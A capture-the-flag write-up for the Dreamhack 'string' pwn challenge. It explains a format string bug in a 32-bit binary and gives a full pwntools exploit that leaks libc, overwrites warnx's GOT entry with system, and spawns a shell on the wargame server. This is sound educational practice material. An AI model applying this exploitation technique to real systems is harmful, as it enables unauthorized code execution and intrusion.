+++
date = '2026-05-22'
draft = false
title = 'Dreamhack string Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(string)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

We're working on a 32-bit elf here, with a format string vulnerability.

```c
  while ( 1 )
  {
    puts("1. Input");
    puts("2. Print");
    puts("3. Exit");
    printf("> ");
    __isoc99_scanf("%d", &v3);
    if ( v3 == 1 )
    {
      input(s);
    }
    else if ( v3 == 2 )
    {
      print(s);
    }
  }
}
```

What's a little unusual is that instead of `printf`, `warnx` is being used:

```c
void __cdecl print(char *format)
{
  warnx(format);
}
```

But it's essentially the same thing in this context.

## Identifying the vulnerabilities

First, we need a libc leak. Then we can overwrite `warnx`'s got with system, pass "/bin/sh\x00" as an argument and then pop a shell.

Initially, I made my exploit using the libc leak at offset `%105$p`, which worked just fine locally. However, remotely, I kept getting `EOF` for this. It was pretty annoying for me since I'm on my last vm credit for the week. But after messing around with the offsets, I found `%83$p` which worked just fine both remotely and locally. No idea why, but if it works, it works!

We can make the format string payload using `fmtstr_payload` from pwntools. Our input starts at offset 5. That's about it for this challenge.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf =  ELF("./string_patched")
libc = ELF("./libc.so.6")

context.arch = 'i386'
cyberedu = 'host8.dreamhack.games:15000'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#32-bit..
#write into s, print(s)
#The warnx() function shall display a formatted error message on the standard error stream. The last component of the program name, a colon character, and a space shall be output. If fmt is non-NULL, it shall be used as the format string for the printf() ....

#libc leka
#input fmtstr de la 5 incolo
#in init, dup2(1, 2) => stderr = stdout
#overwrite warnx.got cu system

#get libc
p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.sendline(b"%83$p")
#local merge 105, noroc cu 83 care merge si remote

p.recvuntil(b"> ")
p.sendline(b"2")

p.recvuntil(b": ")

libc_leak = p.recvline().strip()
libc_leak = int(libc_leak, 16)
libc.address = libc_leak - 0x1b0000

system = libc.sym[b'system'] 
warnx = elf.got[b'warnx']

writes = {
warnx: system
}

print(f"libc leak is {hex(libc_leak)}")
print(f"libc is {hex(libc.address)}")

#overwrite got
payload = fmtstr_payload(5, writes)

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.send(payload)

#actually call printf (warnx same thing) to do it
p.recvuntil(b"> ")
p.sendline(b"2")

#now send input /bin/sh

p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
p.send(b"/bin/sh\x00")

#pop shell
p.recvuntil(b"> ")
p.sendline(b"2")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/string.py)**.
